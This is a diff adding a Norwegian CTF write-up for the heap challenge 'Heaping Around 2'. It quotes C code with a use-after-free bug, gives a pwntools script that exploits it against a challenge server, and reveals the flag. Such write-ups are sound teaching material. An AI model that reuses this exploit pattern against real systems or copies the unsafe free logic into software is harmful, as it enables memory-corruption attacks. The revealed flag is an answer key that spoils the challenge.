@@ -145,6 +145,75 @@ Enkel buffer overflow med 100 bytes buffer:
 </details>
 
 
+## HEAPING AROUND 2
+
+### Oppgave
+
+Hele oppgavebeskrivelsen finnes [her](pwn/heaping_around_2/challenge.md)
+
+### Løsning
+
+Problemet vi kan utnytte ligger i altertiver for å frigjøre minne. Problemet er at hverken minnet eller pointeren dit blir slettet på riktig måte når vi frigjør minnet:
+```c
+if (current_pointer > 0){
+    printf("\nWhich pointer do you want to free? (%i-%i)", 0, current_pointer - 1);
+
+    int idx;
+    scanf("%i", &idx);
+    getchar();
+
+    free(pointers[idx]);
+
+    current_pointer--;
+
+    printf("\nFreed 64 bytes om memory at %p\n", &pointers[current_pointer]);
+}
+```
+
+Det gjør at når vi senere plasserer flagget på det samme stedet har vi allerede en pointer som peker dit og en funksjon som henter den ut. Ganske simpelt:
+
+```py
+from pwn import *
+
+# Connect
+io = remote("10.212.138.23", 53364)
+# io = process("/heaping_around_2/heaping_around_2")
+
+# Create pointer 1, 64 bytes
+print("Allocating pointer 1")
+io.sendlineafter(b"choice:", b"1")
+io.sendlineafter(b"allocate?", b"64")
+
+# Create some pointer 2
+print("Allocating pointer 2")
+io.sendlineafter(b"choice:", b"1")
+io.sendlineafter(b"allocate?", b"1")
+
+# Free up pointer 1
+print("Free up")
+io.sendlineafter(b"choice:", b"2")
+io.sendlineafter(b")", b"0")
+
+# Place flag at pointer 1
+print("Place flag")
+io.sendlineafter(b"choice:", b"4")
+
+# Read mem from pointer 1
+io.sendlineafter(b"choice:", b"3")
+io.sendlineafter(b")", b"0")
+io.interactive() # Recieve flag
+
+# Close the connection
+io.close()
+```
+
+<details>
+<summary>Flagg</summary>
+
+`S2G{3a056d8b5e0e1301d97e6fe3364b0278}`
+</details>
+
+
 
 # REVERSE_ENGINEERING
 
